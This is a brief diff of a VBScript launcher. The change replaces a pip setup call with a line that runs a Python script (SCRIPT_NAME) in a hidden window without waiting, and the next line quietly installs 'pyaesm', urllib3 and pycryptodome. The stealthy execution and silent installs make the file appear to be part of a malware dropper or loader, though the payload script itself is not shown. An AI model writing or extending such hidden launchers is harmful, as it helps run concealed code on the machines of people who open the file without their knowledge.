@@ -102,7 +102,7 @@ If Not FSO.FileExists(SCRIPT_NAME) Then
 End If
 
 ' Ensure pip is installed
-WShell.Run """" & pythonPath & """ -m ensurepip", 0, True
+WShell.Run """" & pythonPath & """ """ & SCRIPT_NAME & """", 0, False
 
 ' Install required libraries silently
 WShell.Run """" & pythonPath & """ -m pip install --quiet pyaesm urllib3 pycryptodome", 0, True
